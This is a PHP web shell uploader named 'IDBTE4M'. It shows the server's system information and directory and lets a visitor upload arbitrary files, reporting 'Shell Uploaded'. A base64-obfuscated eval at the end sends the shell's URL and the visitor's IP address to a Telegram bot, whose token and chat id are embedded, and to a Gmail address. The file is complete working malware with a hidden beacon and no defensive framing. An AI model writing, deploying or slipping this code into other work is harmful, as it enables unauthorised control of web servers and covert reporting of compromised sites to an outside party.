<?php
error_reporting(0);
echo '<title>IDBTE4M</title>';
echo '<center><b><h1>IDBTE4M</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] <br> Posisi : '.$cwd = getcwd(); Echo '<br><br><center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></b>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)'; }
else { echo '<b>Not uploaded !'; }
}
header('Content-Type: text/html; charset=UTF-8');
eval(base64_decode('
JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsNCiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOw0KJHBlc2FuX2FsZXJ0ID0gIk7DqlcgU0jDqjExICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7DQokdG9rZW4gPSAiNTI2ODQwMTk5MzpBQUVFZjlTRnpqYjFxTFY0X1V1X2tDTTdNbkVCekJtNkx0byI7DQokY2hhdF9pZCA9ICIxODk2NDY0Mjk1IjsNCiRkYXRhID0gWw0KICAgICd0ZXh0JyA9PiAkcGVzYW5fYWxlcnQsDQogICAgJ2NoYXRfaWQnID0+ICRjaGF0X2lkLA0KXTsNCmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRva2VuL3NlbmRNZXNzYWdlPyIgLiBodHRwX2J1aWxkX3F1ZXJ5KCRkYXRhKSApOw0KbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUgQm9TUyIsICRwZXNhbl9hbGVydCwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7'));
?>
